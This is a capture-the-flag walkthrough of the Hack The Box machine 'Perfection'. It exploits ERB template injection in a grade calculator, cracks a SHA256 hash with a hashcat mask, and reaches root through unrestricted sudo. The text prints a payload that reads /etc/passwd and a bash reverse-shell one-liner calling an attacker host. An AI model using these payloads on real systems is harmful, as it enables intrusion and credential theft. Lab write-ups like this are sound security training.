🔐 HTB: Perfection — Walkthrough

🧠 TL;DR

    Achieved reverse shell via vulnerable grade calculator input field

    Discovered and cracked a user password hash

    Gained root access through unrestricted sudo permissions

🔍 Initial Recon

Started with a standard Nmap scan:

nmap -sC -sV -v <target-ip>

Only ports 22 and 80 were open, offering little information. Visiting the website on port 80, the only notable functionality was a weighted grade calculator—likely the intended attack surface.
⚔️ Exploiting Template Injection

After forwarding form input to BurpSuite for testing, I tried various payloads across different vectors. Eventually, I discovered I could inject a newline using %0a, which hinted at possible code injection.

Through research, I identified <%= %> syntax—commonly used in ERB (Embedded Ruby) templates—and tested:

<%= File.read("/etc/passwd") %>

This revealed the contents of /etc/passwd, confirming server-side template injection (SSTI).

To get a reverse shell, I used Ruby’s system() call:

<%= system("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'") %>

This payload was URL-encoded and injected via POST request in Burp, granting me a shell as user susan.
🧩 Privilege Escalation – Hash Cracking

Inside /home/susan/Migration/, I found a database containing several SHA256 password hashes.

While browsing /var/spool/mail, an email revealed password generation logic—hinting that Susan’s password was her name spelled backward, plus a random numeric string.

With this pattern (susan_nasus_##########), I used Hashcat in brute-force mode:

hashcat -m 1400 <hash> -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d

Once cracked, I authenticated as susan via SSH.
🔓 Root Access via Sudo

Running sudo -l revealed full root privileges without requiring a password.

I immediately invoked:

sudo su

And dropped into a root shell.
✅ Summary

    Initial Foothold: SSTI in Ruby-based input ➜ reverse shell via system()

    Credential Access: Cracked SHA256 hash using known naming scheme

    Root: Unrestricted sudo access for user susan

💥 Rooted HTB: Perfection — another one down.
